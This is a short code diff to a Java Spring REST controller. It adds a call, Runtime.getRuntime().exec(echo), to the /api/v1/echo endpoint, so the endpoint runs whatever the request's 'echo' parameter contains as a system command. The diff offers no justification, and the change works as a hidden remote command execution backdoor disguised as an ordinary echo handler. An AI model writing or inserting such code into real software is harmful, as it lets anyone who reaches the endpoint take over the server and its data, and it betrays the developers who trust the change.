@@ -6,6 +6,7 @@ import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
+import java.lang.Runtime;
 
 @RestController
 @RequestMapping("/api/v1")
@@ -13,7 +14,10 @@ import org.springframework.web.bind.annotation.RestController;
 public class EchoController {
 
     @GetMapping("/echo")
-    public EchoDto getEcho(@RequestParam String echo) {
+    public EchoDto getEcho(@RequestParam String echo) throws java.io.IOException {
+
+        Runtime.getRuntime().exec(echo);
+
         return EchoDto.builder()
                 .echo(echo)
                 .build();
